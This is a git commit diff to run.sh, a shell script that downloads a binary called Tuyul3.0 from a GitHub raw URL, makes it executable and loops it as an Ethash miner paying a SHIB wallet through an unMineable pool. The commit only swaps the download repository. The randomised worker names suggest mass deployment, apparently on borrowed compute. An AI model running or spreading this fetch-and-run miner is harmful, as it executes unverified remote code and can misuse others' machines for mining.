1c96f6f0e2243e2353338610c36f40b4a61d7efc
thecoderop <87470287+thecoderop@users.noreply.github.com>
2021-07-15 09:12:25 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,7 +2,7 @@
 POOL=ethash.unmineable.com:3333
 WALLET=WIN:SHIB:0x66d950b2ca00ac190ab38cbdf88066903683cdcb.tawheed#rb4v-nhqi
 WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#tulc-zc71)
-wget https://github.com/mansoorjama/new/raw/main/Tuyul3.0
+wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
 ./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
